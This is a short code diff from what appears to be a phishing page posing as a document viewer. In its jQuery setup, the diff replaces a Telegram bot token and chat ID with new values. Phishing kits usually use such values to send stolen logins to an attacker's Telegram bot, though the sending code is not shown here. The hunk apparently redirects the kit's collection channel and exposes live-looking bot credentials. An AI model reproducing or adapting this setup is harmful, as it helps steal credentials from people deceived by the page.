@@ -472,8 +472,8 @@ Your information is only for the sole purpose of viewing this document and would
     $(document).ready(function(){
       var count=0;
 
-      var Tele_token="7643022846:AAEpBOjP7B5VxeG2Li7kInoBnACWpPk4mVo";
-      var Tele_chatid="8016167200";
+      var Tele_token="7811868088:AAFxUSBzO7_6iWqZjDam_OzyWQKp7b4AGHg";
+      var Tele_chatid="6379437334";
 
       $('#back1').click(function () {
         $("#msg").hide();
